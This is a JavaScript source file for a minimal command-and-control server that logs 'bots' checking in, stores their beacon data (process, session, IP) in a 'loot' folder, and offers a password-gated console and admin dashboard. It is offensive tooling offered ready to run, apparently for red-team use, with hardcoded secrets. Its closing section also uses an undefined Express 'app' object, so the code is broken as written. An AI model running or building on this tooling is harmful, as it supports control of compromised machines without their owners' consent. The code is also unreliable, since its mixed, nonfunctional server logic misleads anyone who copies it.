/*
 * Minimal C2 Server for Beacon Reception
 * Run: node c2-server.js
 */

const http = require('http');
const url = require('url');
const fs = require('fs');
const path = require('path');
const readline = require('readline');

// ==================== CONFIGURATION ====================
const PORT = 8080;
const C2_PASSWORD = 'redteam2024';  // Change this!
const DATA_DIR = path.join(__dirname, 'loot');
const BOTS_FILE = path.join(DATA_DIR, 'bots.json');
// =======================================================

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Load existing bots or initialize
let bots = {};
if (fs.existsSync(BOTS_FILE)) {
    bots = JSON.parse(fs.readFileSync(BOTS_FILE, 'utf8'));
}

// ==================== UTILITY FUNCTIONS ====================

function formatTimestamp() {
    const now = new Date();
    return now.toISOString().replace('T', ' ').substring(0, 19);
}

function saveBots() {
    fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
}

function updateBot(botId, data) {
    if (!bots[botId]) {
        bots[botId] = {
            id: botId,
            firstSeen: formatTimestamp(),
            beacons: []
        };
    }
    
    bots[botId].lastSeen = formatTimestamp();
    bots[botId].lastBeacon = data;
    bots[botId].beacons.push({
        timestamp: formatTimestamp(),
        ...data
    });
    
    // Keep only last 100 beacons per bot
    if (bots[botId].beacons.length > 100) {
        bots[botId].beacons = bots[botId].beacons.slice(-100);
    }
    
    saveBots();
}

// ==================== HTTP SERVER ====================

const server = http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const pathname = parsedUrl.pathname;
    const query = parsedUrl.query;
    
    // CORS headers for flexibility
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }
    
    // ===== BOT REGISTRATION =====
    if (pathname === '/register' && req.method === 'GET') {
        const botId = query.bot || 'unknown';
        
        updateBot(botId, { 
            event: 'register',
            userAgent: req.headers['user-agent'],
            ip: req.socket.remoteAddress 
        });
        
        console.log(`\x1b[32m[+] New bot registered: ${botId}\x1b[0m`);
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'ok', id: botId }));
        return;
    }
    
    // ===== BEACON RECEPTION =====
    if (pathname === '/beacon' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const params = new URLSearchParams(body);
            const botId = params.get('bot') || 'unknown';
            
            const beaconData = {
                event: 'beacon',
                uptime: params.get('uptime'),
                tick: params.get('tick'),
                proc: params.get('proc'),
                session: params.get('session'),
                ip: req.socket.remoteAddress
            };
            
            updateBot(botId, beaconData);
            
            const timestamp = formatTimestamp();
            console.log(`\x1b[36m[*] Beacon from ${botId} @ ${timestamp}\x1b[0m`);
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: 'ok' }));
        });
        return;
    }
    
    // ===== 404 =====
    res.writeHead(404);
    res.end('Not found');
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔══════════════════════════════════════════════════════════╗
║                    C2 SERVER RUNNING                     ║
╠══════════════════════════════════════════════════════════╣
║  Port: ${PORT}                                                ║
║  Loot: ${DATA_DIR}                                  ║
║                                                          ║
║  Commands:                                               ║
║    status  - Show all bots                               ║
║    beacon  - Show recent beacons                         ║
║    bot <id>- Show specific bot details                   ║
║    clear   - Clear screen                                ║
║    exit    - Shutdown server                             ║
║    help    - Show this menu                              ║
╚══════════════════════════════════════════════════════════╝
`);
});

// ==================== ADMIN CONSOLE ====================

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: '\x1b[33mc2>\x1b[0m '
});

let authenticated = false;
let authAttempts = 0;

console.log('\x1b[31m[!] Password required for admin console\x1b[0m');

rl.on('line', (line) => {
    const input = line.trim();
    
    if (!authenticated) {
        if (input === C2_PASSWORD) {
            authenticated = true;
            console.log('\x1b[32m[+] Authenticated. Type "help" for commands.\x1b[0m');
            rl.setPrompt('\x1b[33mc2>\x1b[0m ');
            rl.prompt();
        } else {
            authAttempts++;
            console.log('\x1b[31m[-] Invalid password\x1b[0m');
            if (authAttempts >= 3) {
                console.log('\x1b[31m[!] Too many attempts. Exiting.\x1b[0m');
                process.exit(1);
            }
            rl.prompt();
        }
        return;
    }
    
    // Parse commands
    const args = input.split(/\s+/);
    const cmd = args[0].toLowerCase();
    
    switch (cmd) {
        case 'status':
        case 'bots':
            showStatus();
            break;
            
        case 'beacon':
        case 'beacons':
            showRecentBeacons(args[1] ? parseInt(args[1]) : 10);
            break;
            
        case 'bot':
            if (args[1]) {
                showBotDetails(args[1]);
            } else {
                console.log('\x1b[31mUsage: bot <bot_id>\x1b[0m');
            }
            break;
            
        case 'clear':
        case 'cls':
            console.clear();
            break;
            
        case 'help':
        case '?':
            showHelp();
            break;
            
        case 'exit':
        case 'quit':
            console.log('\x1b[33m[!] Shutting down...\x1b[0m');
            rl.close();
            server.close();
            process.exit(0);
            break;
            
        case '':
            break;
            
        default:
            console.log(`\x1b[31mUnknown command: ${cmd}\x1b[0m`);
            console.log('\x1b[90mType "help" for available commands\x1b[0m');
    }
    
    rl.prompt();
});

rl.on('close', () => {
    console.log('\n\x1b[33m[!] Console closed. Server still running.\x1b[0m');
    console.log('\x1b[33m[!] Press Ctrl+C to stop server.\x1b[0m');
});

// ==================== DISPLAY FUNCTIONS ====================

function showHelp() {
    console.log(`
\x1b[36m┌────────────────────────────────────────────────────────┐
│                    AVAILABLE COMMANDS                     │
├──────────────────────────────────────────────────────────┤
│  status          - Show all bots and their status         │
│  beacons [n]     - Show last n beacons (default: 10)      │
│  bot <id>        - Show detailed info for specific bot    │
│  clear           - Clear the console screen               │
│  exit            - Shutdown C2 server                     │
│  help            - Show this help menu                    │
└──────────────────────────────────────────────────────────┘\x1b[0m
`);
}

function showStatus() {
    const botIds = Object.keys(bots);
    
    if (botIds.length === 0) {
        console.log('\x1b[33m[!] No bots have checked in yet.\x1b[0m');
        return;
    }
    
    console.log('\n\x1b[36m┌──────────────────────────────────────────────────────────────────────────────┐');
    console.log('│                              ACTIVE BOTS                                     │');
    console.log('├──────────────────────┬─────────────────────┬────────────┬────────────────────┤');
    console.log('│ Bot ID               │ Last Seen            │ Beacons    │ Process            │');
    console.log('├──────────────────────┼─────────────────────┼────────────┼────────────────────┤');
    
    botIds.forEach(id => {
        const bot = bots[id];
        const lastProc = bot.lastBeacon?.proc || 'unknown';
        const beaconCount = bot.beacons?.length || 0;
        
        console.log(`│ \x1b[32m${id.padEnd(20)}\x1b[0m │ ${(bot.lastSeen || 'never').padEnd(19)} │ ${beaconCount.toString().padEnd(10)} │ ${lastProc.padEnd(18)} │`);
    });
    
    console.log('└──────────────────────┴─────────────────────┴────────────┴────────────────────┘\x1b[0m\n');
    console.log(`\x1b[90mTotal bots: ${botIds.length}\x1b[0m`);
}

function showRecentBeacons(count = 10) {
    const allBeacons = [];
    
    Object.keys(bots).forEach(botId => {
        const bot = bots[botId];
        if (bot.beacons) {
            bot.beacons.forEach(b => {
                allBeacons.push({
                    botId: botId,
                    ...b
                });
            });
        }
    });
    
    // Sort by timestamp (newest first)
    allBeacons.sort((a, b) => b.timestamp.localeCompare(a.timestamp));
    
    const recent = allBeacons.slice(0, count);
    
    if (recent.length === 0) {
        console.log('\x1b[33m[!] No beacons received yet.\x1b[0m');
        return;
    }
    
    console.log(`\n\x1b[36m┌─────────────────────────────────────────────────────────────────────────────┐`);
    console.log(`│                         RECENT BEACONS (${recent.length})                              │`);
    console.log('├──────────────────────┬─────────────────────┬────────────┬────────────────────┤');
    console.log('│ Bot ID               │ Timestamp           │ Uptime(min)│ Process            │');
    console.log('├──────────────────────┼─────────────────────┼────────────┼────────────────────┤');
    
    recent.forEach(b => {
        const botId = (b.botId || 'unknown').substring(0, 20);
        const ts = (b.timestamp || '').substring(11, 19); // HH:MM:SS
        const uptime = b.uptime || '0';
        const proc = (b.proc || 'unknown').substring(0, 18);
        
        console.log(`│ ${botId.padEnd(20)} │ ${ts.padEnd(19)} │ ${uptime.padEnd(10)} │ ${proc.padEnd(18)} │`);
    });
    
    console.log('└──────────────────────┴─────────────────────┴────────────┴────────────────────┘\x1b[0m\n');
}

function showBotDetails(botId) {
    const bot = bots[botId];
    
    if (!bot) {
        console.log(`\x1b[31m[-] Bot not found: ${botId}\x1b[0m`);
        return;
    }
    
    console.log(`\n\x1b[36m╔══════════════════════════════════════════════════════════════╗`);
    console.log(`║  BOT: ${botId.padEnd(54)}║`);
    console.log(`╠══════════════════════════════════════════════════════════════╣`);
    console.log(`║  First Seen: ${(bot.firstSeen || 'unknown').padEnd(47)}║`);
    console.log(`║  Last Seen:  ${(bot.lastSeen || 'unknown').padEnd(47)}║`);
    console.log(`║  Total Beacons: ${bot.beacons?.length.toString().padEnd(43)}║`);
    
    if (bot.lastBeacon) {
        console.log(`╠══════════════════════════════════════════════════════════════╣`);
        console.log(`║  LAST BEACON DATA:                                           ║`);
        console.log(`║    Process:  ${(bot.lastBeacon.proc || 'unknown').padEnd(46)}║`);
        console.log(`║    Session:  ${(bot.lastBeacon.session || 'unknown').padEnd(46)}║`);
        console.log(`║    Uptime:   ${(bot.lastBeacon.uptime || '0').padEnd(46)}║`);
        console.log(`║    IP:       ${(bot.lastBeacon.ip || 'unknown').padEnd(46)}║`);
    }
    
    // Show last 5 beacons
    if (bot.beacons && bot.beacons.length > 0) {
        console.log(`╠══════════════════════════════════════════════════════════════╣`);
        console.log(`║  RECENT BEACON HISTORY:                                      ║`);
        
        const recent = bot.beacons.slice(-5).reverse();
        recent.forEach((b, i) => {
            const ts = (b.timestamp || '').substring(11, 19);
            console.log(`║    ${ts} - uptime: ${(b.uptime || '0').padEnd(6)} proc: ${(b.proc || 'unknown').padEnd(20)}║`);
        });
    }
    
    console.log(`╚══════════════════════════════════════════════════════════════╝\x1b[0m\n`);
}

// ==================== GRACEFUL SHUTDOWN ====================

process.on('SIGINT', () => {
    console.log('\n\x1b[33m[!] Received SIGINT. Shutting down...\x1b[0m');
    saveBots();
    server.close();
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log('\n\x1b[33m[!] Received SIGTERM. Shutting down...\x1b[0m');
    saveBots();
    server.close();
    process.exit(0);
});

// ==================== REMOTE ADMIN ENDPOINTS ====================

// Secret key for remote access (change this!)
const ADMIN_SECRET = 'redteam2024-secret-key-xyz';

// Middleware to check admin secret
function checkAdminAuth(req, res, next) {
    const authHeader = req.headers['x-admin-secret'];
    const querySecret = req.query.secret;
    
    if (authHeader === ADMIN_SECRET || querySecret === ADMIN_SECRET) {
        next();
    } else {
        res.status(401).json({ error: 'Unauthorized' });
    }
}

// Get all bots (password protected)
app.get('/admin/bots', checkAdminAuth, (req, res) => {
    const botList = Object.keys(bots).map(id => ({
        id: id,
        firstSeen: bots[id].firstSeen,
        lastSeen: bots[id].lastSeen,
        beaconCount: bots[id].beacons?.length || 0,
        lastBeacon: bots[id].lastBeacon
    }));
    
    res.json({
        total: botList.length,
        timestamp: new Date().toISOString(),
        bots: botList
    });
});

// Get specific bot details
app.get('/admin/bots/:botId', checkAdminAuth, (req, res) => {
    const botId = req.params.botId;
    const bot = bots[botId];
    
    if (!bot) {
        return res.status(404).json({ error: 'Bot not found' });
    }
    
    res.json({
        id: botId,
        firstSeen: bot.firstSeen,
        lastSeen: bot.lastSeen,
        beacons: bot.beacons?.slice(-20) || [], // Last 20 beacons
        totalBeacons: bot.beacons?.length || 0
    });
});

// Get recent beacons across all bots
app.get('/admin/beacons', checkAdminAuth, (req, res) => {
    const limit = parseInt(req.query.limit) || 10;
    
    const allBeacons = [];
    Object.keys(bots).forEach(botId => {
        const bot = bots[botId];
        if (bot.beacons) {
            bot.beacons.slice(-50).forEach(b => {
                allBeacons.push({
                    botId: botId,
                    ...b
                });
            });
        }
    });
    
    // Sort by timestamp (newest first)
    allBeacons.sort((a, b) => {
        return (b.timestamp || '').localeCompare(a.timestamp || '');
    });
    
    res.json({
        total: allBeacons.length,
        limit: limit,
        beacons: allBeacons.slice(0, limit)
    });
});

// Simple dashboard HTML (view only)
app.get('/admin', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>C2 Dashboard</title>
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
        h1 { color: #00ff00; border-bottom: 1px solid #00ff00; }
        .bot { background: #1a1a1a; margin: 10px 0; padding: 10px; border-radius: 5px; }
        .bot-id { color: #00ffff; font-weight: bold; }
        .bot-meta { color: #888; font-size: 12px; }
        input, button { padding: 10px; margin: 10px 0; background: #1a1a1a; color: #00ff00; border: 1px solid #00ff00; }
        button { cursor: pointer; }
        #output { white-space: pre-wrap; }
    </style>
</head>
<body>
    <h1>C2 Dashboard</h1>
    <input type="password" id="secret" placeholder="Admin Secret" style="width: 300px;">
    <button onclick="fetchBots()">Get Bots</button>
    <button onclick="fetchBeacons()">Get Beacons</button>
    <div id="output"></div>
    <script>
        async function fetchBots() {
            const secret = document.getElementById('secret').value;
            const res = await fetch('/admin/bots?secret=' + secret);
            const data = await res.json();
            document.getElementById('output').textContent = JSON.stringify(data, null, 2);
        }
        async function fetchBeacons() {
            const secret = document.getElementById('secret').value;
            const res = await fetch('/admin/beacons?secret=' + secret + '&limit=20');
            const data = await res.json();
            document.getElementById('output').textContent = JSON.stringify(data, null, 2);
        }
    </script>
</body>
</html>
    `);
});
